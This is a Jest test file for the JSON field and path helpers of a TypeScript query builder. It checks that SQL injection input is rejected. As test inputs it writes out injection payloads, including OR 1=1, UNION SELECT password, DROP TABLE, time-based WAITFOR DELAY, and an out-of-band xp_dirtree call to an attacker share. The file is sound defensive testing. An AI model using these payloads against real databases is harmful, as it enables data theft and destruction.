import { TypedQuery } from "../../src";
import { MockPool } from "../test_utils/MockPool";
import { DatabaseError } from "../../src/errors";

interface TestRow {
  id: number;
  data: Record<string, any>;
  jsonbData: Record<string, any>;
}

interface TestSchema {
  test_table: TestRow;
}

describe("JSON Operations Security", () => {
  let pool: MockPool;
  let query: TypedQuery<"test_table", TestRow, TestSchema>;

  beforeEach(() => {
    pool = new MockPool();
    query = new TypedQuery<"test_table", TestRow, TestSchema>(
      pool as any,
      "test_table"
    );
  });

  describe("SQL Injection Prevention - Field Names", () => {
    it("should reject field names with SQL injection using OR", () => {
      expect(() => {
        query.jsonField("data", "field' OR '1'='1");
      }).toThrow(DatabaseError);

      expect(() => {
        query.jsonField("data", "field' OR '1'='1");
      }).toThrow(/SQL operators in suspicious context/i);
    });

    it("should allow field names with single quotes (they are escaped)", () => {
      expect(() => {
        const field = query.jsonFieldAsText("data", "field'with'quotes");
        expect(field).toContain("field''with''quotes"); // Escaped quotes
      }).not.toThrow();
    });

    it("should reject field names with double quotes", () => {
      expect(() => {
        query.jsonField("data", 'field"injection');
      }).toThrow(DatabaseError);
    });

    it("should reject field names with backticks", () => {
      // Backticks are used in MySQL and could be confusing, so reject them
      expect(() => {
        query.jsonField("data", "field`name");
      }).toThrow(DatabaseError);
    });

    it("should reject field names with semicolons", () => {
      expect(() => {
        query.jsonField("data", "field; DROP TABLE users");
      }).toThrow(DatabaseError);

      expect(() => {
        query.jsonField("data", "field; DROP TABLE users");
      }).toThrow(/dangerous characters|SQL keywords/i);
    });

    it("should reject field names with SQL comments", () => {
      expect(() => {
        query.jsonField("data", "field--comment");
      }).toThrow(DatabaseError);

      expect(() => {
        query.jsonField("data", "field/* comment */");
      }).toThrow(DatabaseError);
    });

    it("should reject field names with UNION keyword", () => {
      expect(() => {
        query.jsonField("data", "field' UNION SELECT password");
      }).toThrow(DatabaseError);

      expect(() => {
        query.jsonField("data", "field' UNION SELECT password");
      }).toThrow(/SQL keywords|SQL operators/i);
    });

    it("should reject empty field names", () => {
      expect(() => {
        query.jsonField("data", "");
      }).toThrow(DatabaseError);

      expect(() => {
        query.jsonField("data", "");
      }).toThrow(/cannot be empty/i);
    });

    it("should reject field names with only whitespace", () => {
      expect(() => {
        query.jsonField("data", "   ");
      }).toThrow(DatabaseError);
    });

    it("should reject overly long field names (DoS prevention)", () => {
      const longField = "a".repeat(300);
      expect(() => {
        query.jsonField("data", longField);
      }).toThrow(DatabaseError);

      expect(() => {
        query.jsonField("data", longField);
      }).toThrow(/exceeds maximum length/i);
    });

    it("should allow valid field names with underscores", () => {
      const field = query.jsonField("data", "valid_field_name");
      expect(field).toBe("data->'valid_field_name'");
    });

    it("should allow valid field names with hyphens", () => {
      const field = query.jsonField("data", "valid-field-name");
      expect(field).toBe("data->'valid-field-name'");
    });

    it("should allow valid field names with dots", () => {
      const field = query.jsonField("data", "field.name");
      expect(field).toBe("data->'field.name'");
    });

    it("should allow valid field names with dollar signs", () => {
      const field = query.jsonField("data", "$field");
      expect(field).toBe("data->'$field'");
    });

    it("should allow numeric-only field names", () => {
      const field = query.jsonField("data", "123");
      expect(field).toBe("data->'123'");
    });

    it("should allow field names with spaces", () => {
      const field = query.jsonField("data", "field name");
      expect(field).toContain("field name");
    });
  });

  describe("SQL Injection Prevention - JSON Paths", () => {
    it("should reject path components with SQL injection attempts", () => {
      expect(() => {
        query.jsonPath("data", ["address", "' OR '1'='1"]);
      }).toThrow(DatabaseError);
    });

    it("should reject path components with UNION SELECT", () => {
      expect(() => {
        query.jsonPath("data", [
          "address",
          "' UNION SELECT password FROM users --",
        ]);
      }).toThrow(DatabaseError);
    });

    it("should reject path components with concatenation operator", () => {
      expect(() => {
        query.jsonPath("data", [
          "address",
          "' || (SELECT password FROM users LIMIT 1) || '",
        ]);
      }).toThrow(DatabaseError);
    });

    it("should reject empty path components", () => {
      expect(() => {
        query.jsonPath("data", ["address", ""]);
      }).toThrow(DatabaseError);
    });

    it("should reject path with all empty components", () => {
      expect(() => {
        query.jsonPath("data", ["", ""]);
      }).toThrow(DatabaseError);
    });

    it("should allow valid path components", () => {
      const path = query.jsonPath("data", ["address", "city"]);
      expect(path).toBe("data#>ARRAY['address','city']");
    });

    it("should allow valid path with numeric indices", () => {
      const path = query.jsonPath("data", ["items", "0", "name"]);
      expect(path).toBe("data#>ARRAY['items','0','name']");
    });
  });

  describe("SQL Injection Prevention - JSONB Operations", () => {
    it("should reject malicious path in jsonbSet", () => {
      expect(() => {
        query.jsonbSet("data", ["address", "'; DROP TABLE users; --"], "value");
      }).toThrow(DatabaseError);
    });

    it("should reject malicious path in jsonbInsert", () => {
      expect(() => {
        query.jsonbInsert("data", ["items", "'; DELETE FROM users; --"], "value");
      }).toThrow(DatabaseError);
    });

    it("should reject malicious path in jsonbDeletePath", () => {
      expect(() => {
        query.jsonbDeletePath("data", ["address", "' OR '1'='1"]);
      }).toThrow(DatabaseError);
    });

    it("should reject malicious key in jsonbDeleteKey", () => {
      expect(() => {
        query.jsonbDeleteKey("data", "key' OR '1'='1");
      }).toThrow(DatabaseError);
    });

    it("should reject malicious key in jsonbBuildObject", () => {
      expect(() => {
        query.jsonbBuildObject({ "key' OR '1'='1": "value" });
      }).toThrow(DatabaseError);
    });

    it("should allow valid jsonbSet operation", () => {
      const expr = query.jsonbSet("data", ["address", "city"], "New York");
      expect(expr).toContain("jsonb_set");
      expect(expr).toContain("{address,city}");
    });

    it("should allow valid jsonbInsert operation", () => {
      const expr = query.jsonbInsert("data", ["items", "0"], "new item");
      expect(expr).toContain("jsonb_insert");
      expect(expr).toContain("{items,0}");
    });

    it("should allow valid jsonbDeletePath operation", () => {
      const expr = query.jsonbDeletePath("data", ["address", "city"]);
      expect(expr).toContain("#-");
      expect(expr).toContain("{address,city}");
    });

    it("should allow valid jsonbDeleteKey operation", () => {
      const expr = query.jsonbDeleteKey("data", "oldField");
      expect(expr).toContain("- 'oldField'");
    });

    it("should allow valid jsonbBuildObject operation", () => {
      const expr = query.jsonbBuildObject({ name: "John", age: 30 });
      expect(expr).toContain("jsonb_build_object");
      expect(expr).toContain("'name'");
    });
  });

  describe("SQL Injection Prevention - Complex Attacks", () => {
    it("should reject stacked queries", () => {
      expect(() => {
        query.jsonField("data", "field'; DROP TABLE users; SELECT '");
      }).toThrow(DatabaseError);
    });

    it("should reject subquery injection", () => {
      expect(() => {
        query.jsonField("data", "' AND 1=(SELECT COUNT(*) FROM users)--");
      }).toThrow(DatabaseError);
    });

    it("should reject boolean-based blind SQL injection", () => {
      expect(() => {
        query.jsonField("data", "' AND 1=1--");
      }).toThrow(DatabaseError);
    });

    it("should reject time-based blind SQL injection", () => {
      expect(() => {
        query.jsonField("data", "'; WAITFOR DELAY '00:00:05'--");
      }).toThrow(DatabaseError);
    });

    it("should reject out-of-band SQL injection", () => {
      expect(() => {
        query.jsonField(
          "data",
          "'; EXEC master..xp_dirtree '\\\\attacker\\share'--"
        );
      }).toThrow(DatabaseError);
    });
  });

  describe("Integration with WHERE clauses", () => {
    it("should safely handle JSON field access in WHERE clause", async () => {
      // This should work - parameterized value
      await query.where("data->>'name'", "=", "John").execute();

      expect(pool).toHaveExecutedQueryWithParams(
        "SELECT * FROM test_table WHERE data->>'name' = $1",
        ["John"]
      );
    });

    it("should validate field names even when used in expressions", () => {
      expect(() => {
        const field = query.jsonField("data", "'; DROP TABLE users; --");
        query.where(field, "=", "value");
      }).toThrow(DatabaseError);
    });
  });

  describe("Error messages should not leak sensitive info", () => {
    it("should provide clear error message for SQL injection attempt", () => {
      try {
        query.jsonField("data", "field' OR '1'='1");
        fail("Should have thrown an error");
      } catch (error) {
        expect(error).toBeInstanceOf(DatabaseError);
        expect((error as DatabaseError).code).toBe("SQL_INJECTION_ATTEMPT");
        expect((error as DatabaseError).message).toMatch(
          /SQL keywords|SQL operators|dangerous characters/i
        );
      }
    });

    it("should provide clear error message for invalid identifier", () => {
      try {
        query.jsonField("data", "field; invalid");
        fail("Should have thrown an error");
      } catch (error) {
        expect(error).toBeInstanceOf(DatabaseError);
        expect((error as DatabaseError).code).toBe("SQL_INJECTION_ATTEMPT");
      }
    });
  });
});
